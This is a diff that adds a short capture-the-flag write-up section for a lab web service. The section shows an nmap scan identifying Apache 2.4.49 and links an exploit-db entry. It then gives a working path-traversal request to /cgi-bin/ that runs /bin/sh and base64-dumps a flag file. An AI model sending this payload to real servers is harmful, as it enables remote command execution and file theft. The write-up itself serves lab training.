@@ -1,0 +1,27 @@
+<h3>Port 12380 [Web]</h3>
+
+<p>Our scan shows that this is a vulnerable version of Apache.</p>
+
+<p>```
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-04 05:02 UTC
+Nmap scan report for 172.17.17.69
+Host is up (0.00049s latency).</p>
+
+<p>PORT      STATE SERVICE VERSION
+12380/tcp open  http    Apache httpd 2.4.49 ((Debian))
+|<em>http-title: Site doesn't have a title (text/html).
+|</em>http-server-header: Apache/2.4.49 (Debian)
+```</p>
+
+<p>{% embed url="https://www.exploit-db.com/exploits/50383" %}</p>
+
+<p>We can exploit the RCE vulnerability to obtain the contents of the flag.</p>
+
+<p>```http
+GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
+Host: localhost:8000
+Content-Type: text/plain
+Content-Length: 71</p>
+
+<p>echo Content-Type: text/plain; echo; cat /secret/safe/flag.png | base64
+```</p>
